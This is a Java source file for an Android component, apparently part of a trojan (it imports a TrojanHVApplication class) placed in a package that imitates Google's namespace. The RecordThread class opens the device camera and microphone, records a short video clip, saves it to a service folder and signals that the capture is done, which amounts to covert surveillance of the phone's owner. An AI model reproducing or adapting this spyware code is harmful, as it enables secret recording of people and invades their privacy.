package com.google.security.tools;

import java.io.File;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import com.google.security.FinishReceiver;
import com.google.security.MainService;
import com.google.security.TrojanHVApplication;

import android.content.Context;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

/*
 * Function：RecordThread，Record Video
 * Author：   RongRong
 * Create Date: 2015.11.11
 * Update Date：
 * */
public class RecordThread extends Thread {

	private static final String LOGTAG = "RecordThread";
	private MediaRecorder mediarecorder;// 录制视频的类
	private SurfaceHolder surfaceHolder;
	private long recordTime = 1000 * 10; // 时间为10秒钟
	private SurfaceView surfaceview;// 显示视频的控件
	private Camera mCamera;
	private Context context;

	public RecordThread(long recordTime, SurfaceView surfaceview,
			SurfaceHolder surfaceHolder, Context context) {
		this.recordTime = recordTime;
		this.surfaceview = surfaceview;
		this.surfaceHolder = surfaceHolder;
		this.context = context;
	}

	@Override
	public void run() {
		/**
		 * 开始录像
		 */
		try {
			startRecord();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		/**
		 * 启动定时器，到规定时间recordTime后执行停止录像任务
		 */
		Timer timer = new Timer();

		timer.schedule(new TimerThread(), recordTime);
	}

	/**
	 * 获取摄像头实例对象
	 * 
	 * @return
	 */
	public Camera getCameraInstance() {
		Camera c = null;
		try {
			c = Camera.open();
		} catch (Exception e) {
			// 打开摄像头错误
			e.printStackTrace();
			Log.e(LOGTAG, "打开摄像头错误");
		}
		return c;
	}

	/**
	 * 开始录像
	 */
	public void startRecord() {
		mediarecorder = new MediaRecorder();// 创建mediarecorder对象
		mCamera = getCameraInstance();
		// 解锁camera
		if (mCamera != null) {
			mCamera.unlock();
			mediarecorder.setCamera(mCamera);
			// 设置录制视频源为Camera(相机)
			mediarecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
			mediarecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
			CamcorderProfile camcorderProfile = CamcorderProfile
					.get(CamcorderProfile.QUALITY_LOW);
			// camcorderProfile.videoFrameRate = 15;
			camcorderProfile.videoCodec = MediaRecorder.VideoEncoder.H264;
			// camcorderProfile.audioCodec = MediaRecorder.AudioEncoder.AAC;
			camcorderProfile.fileFormat = MediaRecorder.OutputFormat.MPEG_4;
			// 设置录制文件质量，格式，分辨率之类，这个全部包括了
			mediarecorder.setProfile(camcorderProfile);

			mediarecorder.setPreviewDisplay(surfaceHolder.getSurface());
			// 设置视频文件输出的路径
			mediarecorder.setOutputFile(MainService.VIDEO_FORDER_PATH
					+ File.separator + System.currentTimeMillis() / 1000
					+ ".mp4");
			try {
				// 准备录制
				mediarecorder.prepare();
				// 开始录制
				mediarecorder.start();
			} catch (IllegalStateException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

	/**
	 * 停止录制
	 */
	public void stopRecord() {
		if (mediarecorder != null) {
			// 停止录制
			mediarecorder.stop();
			// 释放资源
			mediarecorder.release();
			mediarecorder = null;
			if (mCamera != null) {
				mCamera.release();
				mCamera = null;
			}
		}

		while (true) {
			File dir = new File(MainService.VIDEO_FORDER_PATH);
			if (dir.list().length != 0) {
				FinishReceiver.finishbroadcast("video", context);
				break;
			}
		}
	}

	/**
	 * 定时器
	 * 
	 * @author bcaiw
	 * 
	 */
	class TimerThread extends TimerTask {

		/**
		 * 停止录像
		 */
		@Override
		public void run() {
			try {
				stopRecord();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			this.cancel();
		}

	}

}
